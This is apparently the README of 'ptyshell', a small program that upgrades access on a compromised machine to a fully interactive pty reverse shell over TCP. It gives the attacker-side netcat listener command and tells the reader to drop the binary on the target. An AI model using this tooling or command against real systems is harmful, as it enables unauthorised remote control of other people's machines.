# ptyshell
Annoyed that you can't use vim, or play snake on the machine you just got a
shell on? Here is the solution, this program provides a fully interactive, pty
reverse shell over a TCP connection.

## usage
Run a listener with `stty raw -echo; nc -lvp <port>; stty -raw echo`,
and drop the binary on the target.

## improvments
I plan to rewrite this in assembly for a smaller binary size, for now
`musl-gcc` is used to generate ~30K statically linked binary.
